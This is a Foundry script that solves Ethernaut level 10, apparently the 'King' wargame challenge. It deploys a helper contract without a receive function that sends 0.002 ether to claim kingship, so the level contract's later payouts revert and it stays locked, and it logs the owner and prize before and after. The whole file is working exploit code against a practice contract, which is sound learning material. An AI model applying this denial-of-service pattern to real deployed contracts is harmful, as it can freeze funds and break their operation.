// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {EthernautL10} from "../src/EthernautL10.sol";

contract MiddleManContract {
    constructor() payable{
        address(0x607D5D22331f87aB19F3B018132Cbaf13C41948F).call{value: 0.002 ether}("");
    }   
}

contract EthernautL10Script is Script {
    // First claim ownership of the contract by sending the same amount
    // From forge cast we are able to to find out the amount of sent eth to the contract from the current king
    //  0.001 ether

    // What we can play around is the ability the make sure who is the owner when we call the receive function
    // We create a new contract
    // We use the new contract to call the receive the function and from there is the lvl contract tries to send funds
    // It will fail because the contract is empty

    EthernautL10 public ethernautL10 = EthernautL10(payable(0x607D5D22331f87aB19F3B018132Cbaf13C41948F));

    MiddleManContract public middleManContract;

    function run() public {

        //  Check the owner of the EthernautL10 contract
        console.log("Owner of the EthernautL10 contract: ", ethernautL10.owner());

        // Check the prize of the EthernautL10 contract
        console.log("Prize of the EthernautL10 contract: ", ethernautL10.prize());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new MiddleManContract{value: 0.002 ether}();
        vm.stopBroadcast(); 

        // Check if the owner changed
        console.log("Owner of the EthernautL10 contract: ", ethernautL10.owner());

        // Check the prize of the EthernautL10 contract
        console.log("Prize of the EthernautL10 contract: ", ethernautL10.prize());


    }
}
